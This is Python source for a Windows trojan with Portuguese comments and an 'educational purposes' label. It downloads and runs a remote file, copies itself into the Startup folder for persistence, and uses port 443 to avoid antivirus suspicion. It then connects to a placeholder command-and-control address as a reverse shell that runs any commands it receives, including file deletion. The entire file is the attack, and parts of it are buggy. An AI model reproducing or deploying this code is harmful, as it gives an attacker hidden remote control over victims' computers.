# Feito por Jubileu8888 do Github https://github.com/Jubileu8888
# Trojan feito para fins educacionais

import socket
import subprocess
import threading
import time
import os
import urllib.request as request
from subprocess import call
import getpass
import shutil


CCIP = "SEU CCIP"
CCPORT = 443 # Usei 443 pois e a porta do HTTPS para o antivirus não desconfiar muito deste trojan.

username = getpass.getuser()

url_img = "https://i.imgur.com/LRe0HMc.jpg"

img_name = "LRe0HMc.jpg" * 2

dest = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

request.urlretrieve(url_img, img_name + ".png")

call(f"{img_name}.png && move {img_name}.exe {dest}", shell=True)

dir_atual = os.getcwd()
dir_python = dir_atual + r"\trojan.exe"



def copiar_e_colar_arquivo(origem, destino):
    try:
        shutil.copy(origem, destino)
        print(f"Arquivo {origem} copiado para {destino}")
    except FileNotFoundError:
        print(f"Erro: O arquivo {origem} não foi encontrado.")
    except PermissionError:
        print(f"Erro: Sem permissão para copiar o arquivo {origem}.")
    except Exception as e:
        print(f"Erro inesperado: {str(e)}")

# Exemplo de uso
origem = dir_python
destino = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

copiar_e_colar_arquivo(origem, destino)



def autorun():
    filen = os.path.basename(__file__)
    exe_file = filen.replace(".py,",".exe")
    os.system(r"copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_file))

def conn(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)

def cmd(client, data):
    try:
        if data.startswith("/cd "):

            new_directory = data[4:].strip()
            os.chdir(new_directory)
            client.send(f"Diretorio alterado")

        if data.startswith("/del "):
            file_del = data[:5].strip()
            try:
                os.remove(file_del)
                response = "Arquivo excluido com sucesso."
            except Exception as error:
                response = "Erro em excluir arquivo"

            client.send(response.encode())
        else:
            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            client.send(output + b"\n")
    except Exception as error:
        print(error)

def cli(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/:kill":
                return
            else:
                if data.startswith("/cd"):
                    os.chdir(data[4:].strip())
                    client.send("Diretorio trocado.")
                else:
                    threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as error:
        client.close()

if __name__ == "__main__":
    autorun()
    while True:
        client = conn(CCIP, CCPORT)
        if client:
            cli(client)
        else:
            time.sleep(3)